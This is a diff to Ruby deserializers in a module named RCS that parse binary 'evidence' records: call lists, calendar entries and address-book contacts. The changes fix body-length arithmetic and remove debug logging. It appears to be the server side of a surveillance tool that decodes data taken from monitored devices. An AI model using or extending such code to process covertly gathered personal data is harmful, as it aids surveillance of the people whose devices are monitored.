@@ -43,6 +43,10 @@ module RCS
     end
 
     def unserialize(stream)
+
+      # HEADER
+      header_begin = stream.pos
+
       tot_size = stream.read_dword
       @version = stream.read_dword
       @status = stream.read_dword
@@ -52,13 +56,17 @@ module RCS
       @delivery_time = Time.from_filetime high, low
       @n_attachments = stream.read_dword
 
-      content = stream.read(tot_size - stream.pos)
+      # BODY
+      header_length = stream.pos - header_begin
+      content = stream.read(tot_size - header_length)
       until content.empty?
         prefix = content.slice!(0, 4)
         type, size = Serialization.decode_prefix prefix
         str = content.slice!(0, size)
         @fields[TYPES[type]['field']] = self.send(TYPES[type]['action'], str) if TYPES.has_key? type
       end
+
+      self
     end
 
     def unserialize_string(str)
@@ -87,6 +95,10 @@ module RCS
     end
 
     def unserialize(stream)
+
+      # HEADER
+      header_begin = stream.pos
+
       tot_size = stream.read(4).unpack('L').shift
       version = stream.read(4).unpack('L').shift
 
@@ -103,9 +115,10 @@ module RCS
         @properties << :incoming
       end
 
-      trace :debug, "CallListSerializer @properties #{@properties} (#{props})"
+      # BODY
+      header_length = stream.pos - header_begin
+      content = stream.read(tot_size - header_length)
 
-      content = stream.read(tot_size - stream.pos)
       until content.empty?
         prefix = content.slice!(0, 4)
         type, size = Serialization.decode_prefix prefix
@@ -137,23 +150,28 @@ module RCS
     end
 
     def unserialize(stream)
+      header_begin = stream.pos
+
       tot_size = stream.read(4).unpack('L').shift
       version = stream.read(4).unpack('L').shift
       oid = stream.read(4).unpack('L').shift
 
       raise EvidenceDeserializeError.new("Invalid version") unless version == POOM_V1_0_PROTO
 
-      content = stream.read(tot_size - stream.pos)
+      # BODY
+      header_length = stream.pos - header_begin
+      content = stream.read(tot_size - header_length)
       until content.empty?
         @flags = content.slice!(0, 4).unpack('L').shift
+
         ft_low = content.slice!(0, 4).unpack('L').shift
         ft_high = content.slice!(0, 4).unpack('L').shift
         @start_date = Time.from_filetime(ft_high, ft_low)
-        trace :debug, "[CalendarSerializer] start date #{@start_date}"
+
         ft_low = content.slice!(0, 4).unpack('L').shift
         ft_high = content.slice!(0, 4).unpack('L').shift
         @end_date = Time.from_filetime(ft_high, ft_low)
-        trace :debug, "[CalendarSerializer] end date #{@end_date}"
+
         @sensitivity = content.slice!(0, 4).unpack('L').shift
         @busy = content.slice!(0, 4).unpack('L').shift
         @duration = content.slice!(0, 4).unpack('L').shift
@@ -166,21 +184,20 @@ module RCS
           ft_low = content.slice!(0, 4).unpack('L').shift
           ft_high = content.slice!(0, 4).unpack('L').shift
           @pattern_start_date = Time.from_filetime(ft_high, ft_low)
-          trace :debug, "[CalendarSerializer] pattern start date #{@pattern_start_date}"
+
           ft_low = content.slice!(0, 4).unpack('L').shift
           ft_high = content.slice!(0, 4).unpack('L').shift
           @pattern_end_date = Time.from_filetime(ft_high, ft_low)
-          trace :debug, "[CalendarSerializer] pattern end date #{@pattern_end_date}"
         end
 
         until content.empty? do
           prefix = content.slice!(0, 4)
           type, size = Serialization.decode_prefix prefix
-          @fields[CALENDAR_TYPES[type]] = content.slice!(0, size).utf16le_to_utf8
-          trace :debug, "[CalendarSerializer] type: #{type.to_s(16)} field: #{CALENDAR_TYPES[type]} => #{@fields[CALENDAR_TYPES[type]]}"
+          @fields[CALENDAR_TYPES[type]] = content.slice!(0, size).utf16le_to_utf8 if CALENDAR_TYPES.has_key? type
         end
       end
-      return self
+
+      self
     end
 
   end #CalendarSerializer
@@ -269,6 +286,9 @@ module RCS
     end
 
     def unserialize(stream)
+
+      header_begin = stream.pos
+
       # discard header
       tot_size = stream.read(4).unpack("L").shift
       version = stream.read(4).unpack("L").shift
@@ -278,22 +298,19 @@ module RCS
 
       @fields = {}
 
-      content = stream.read(tot_size - stream.pos)
-      #trace :debug, "[ADDRESSBOOK] TOTAL #{tot_size} got #{content.bytesize}"
+      # BODY
+      header_length = stream.pos - header_begin
+      content = stream.read(tot_size - header_length)
       until content.empty?
         type, size = Serialization.decode_prefix content.slice!(0, 4)
-        #trace :debug, "[ADDRESSBOOK] field size #{size} type #{type}"
         str = content.slice!(0, size).utf16le_to_utf8
-        #trace :debug, "[ADDRESSBOOK] type #{type.to_s(16)}: #{str}"
-        @fields[ADDRESSBOOK_TYPES[type]] = str
+        @fields[ADDRESSBOOK_TYPES[type]] = str if ADDRESSBOOK_TYPES.has_key? type
       end
 
       # name
       @name = ""
       @name = @fields[:first_name] if @fields.has_key? :first_name
       @name += " " + @fields[:last_name] if @fields.has_key? :last_name
-
-      #trace :debug, "[ADDRESSBOOK] name #{@name}"
 
       # contact
       @contact = ""
@@ -311,8 +328,6 @@ module RCS
         @contact = @fields[:radio_phone_number]
       end
 
-      #trace :debug, "[ADDRESSBOOK] contact #{@contact}"
-
       # info
       @info = ""
       omitted_fields = [:first_name, :last_name, :body, :file_as]
@@ -324,9 +339,7 @@ module RCS
         @info += "\n"
       end
 
-      #trace :debug, "[ADDRESSBOOK] info #{@info}"
-
-      return self
+      self
     end
 
   end # ::PoomSerializer
